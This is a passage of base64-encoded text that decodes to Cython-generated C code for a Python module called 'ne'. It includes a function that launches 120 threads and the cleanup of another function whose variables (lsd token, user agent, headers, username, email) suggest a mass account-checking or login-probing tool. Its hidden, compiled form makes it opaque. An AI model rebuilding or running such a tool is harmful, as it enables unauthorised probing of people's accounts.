gICAgX19weXhfTDIyOjsKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0w2X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICB9CiAgICAgIGdvdG8gX19weXhfTDdfZXhjZXB0X2Vycm9yOwoKICAgICAgCiAgICAgIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcjo7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgICBfX3B5eF9MNl9leGNlcHRpb25faGFuZGxlZDo7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgICBfX3B5eF9MMTJfdHJ5X2VuZDo7CiAgICB9CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUudXV1IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kb21haW4pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9iYmspOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9JZG8pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9ybmQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VyX2FnZW50KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9sc2QpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcm5hbWUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9ycik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Zvd3MpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMm5lXzN1dXVfMmdlbmVyYXRvcjMpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV8yMXByaW50aW5nKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5lXzIxcHJpbnRpbmcgPSB7InByaW50aW5nIiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJuZV8yMXByaW50aW5nLCBNRVRIX05PQVJHUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzIxcHJpbnRpbmcoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicHJpbnRpbmcgKHdyYXBwZXIpIiwgMCk7CiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICBfX3B5eF9yID0gX19weXhfcGZfMm5lXzIwcHJpbnRpbmcoX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8yMHByaW50aW5nKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpIHsKICBDWVRIT05fVU5VU0VEIGxvbmcgX19weXhfdl9pOwogIFB5T2JqZWN0ICpfX3B5eF92X3QgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGxvbmcgX19weXhfdF8xOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzY7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgaW50IF9fcHl4X3RfODsKICBQeV9zc2l6ZV90IF9fcHl4X3RfOTsKICBQeU9iamVjdCAqKCpfX3B5eF90XzEwKShQeU9iamVjdCAqKTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcmludGluZyIsIDApOwoKICAKICBmb3IgKF9fcHl4X3RfMSA9IDA7IF9fcHl4X3RfMSA8IDB4Nzg7IF9fcHl4X3RfMSs9MSkgewogICAgX19weXhfdl9pID0gX19weXhfdF8xOwoKICAgIAogICAgX19weXhfdF8zID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDUzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDUzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF82ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzYgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfMywgTlVMTH07CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQ1MywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90YXJnZXQsIF9fcHl4X3RfNCwgX19weXhfdF83LCBfX3B5eF9jYWxsYXJncysxLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ1MywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF83KTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTMsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIH0KICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdCwgX19weXhfdF8yKTsKICAgIF9fcHl4X3RfMiA9IDA7CgogICAgCiAgICBfX3B5eF90XzUgPSBfX3B5eF92X3Q7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgIF9fcHl4X3RfNiA9IDA7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9OwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RhcnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogICAgCiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9BcHBlbmQoX19weXhfdF8yLCBfX3B5eF92X3QpOyBpZiAodW5saWtlbHkoX19weXhfdF84ID09ICgoaW50KS0xKSkpIF9fUFlYX0VSUigwLCA0NTUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgfQoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8yKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X3RfMikpIHsKICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfMjsgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzkgPSAwOwogICAgX19weXhfdF8xMCA9IE5VTEw7CiAgfSBlbHNlIHsKICAgIF9fcHl4X3RfOSA9IC0xOyBfX3B5eF90XzUgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ1NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIF9fcHl4X3RfMTAgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNDU3LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgZm9yICg7OykgewogICAgaWYgKGxpa2VseSghX19weXhfdF8xMCkpIHsKICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzUpKSkgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzUpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDU3LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgICNlbmRpZgogICAgICAgICAgaWYgKF9fcHl4X3RfOSA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgICAgICB9CiAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF81LCBfX3B5eF90XzkpOwogICAgICAgICsrX19weXhfdF85OwogICAgICB9IGVsc2UgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoX19weXhfdF81KTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDQ1NywgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzkgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X05ld1JlZihQeVR1cGxlX0dFVF9JVEVNKF9fcHl4X3RfNSwgX19weXhfdF85KSk7CiAgICAgICAgI2Vsc2UKICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oX19weXhfdF81LCBfX3B5eF90XzkpOwogICAgICAgICNlbmRpZgogICAgICAgICsrX19weXhfdF85OwogICAgICB9CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ1NywgX19weXhfTDFfZXJyb3IpCiAgICB9IGVsc2UgewogICAgICBfX3B5eF90XzIgPSBfX3B5eF90XzEwKF9fcHl4X3RfNSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgNDU3LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdCwgX19weXhfdF8yKTsKICAgIF9fcHl4X3RfMiA9IDA7CgogICAgCiAgICBfX3B5eF90XzcgPSBfX3B5eF92X3Q7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfNiA9IDA7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9OwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfam9pbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDU4LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5wcmludGluZyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdCk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkpKSB7CiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJdOwogICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKTsKICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpOwogICAgUHlPYmplY3RfR0NfVHJhY2sobyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8pIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7CiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpIHsKICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuOwogICAgfQogIH0KICAjZW5kaWYKICBQeU9iamVjdF9HQ19VblRyYWNrKG8pOwogIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7CiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQoKc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkgewogIGludCBlOwogIHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilvOwogIHsKICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7CiAgICBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfdl9pKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X2ksIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIHJldHVybiAwOwp9CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zbG90c1tdID0gewogIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcn0sCiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LAogIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJuZV9fX3B5eF9zY29wZV9zd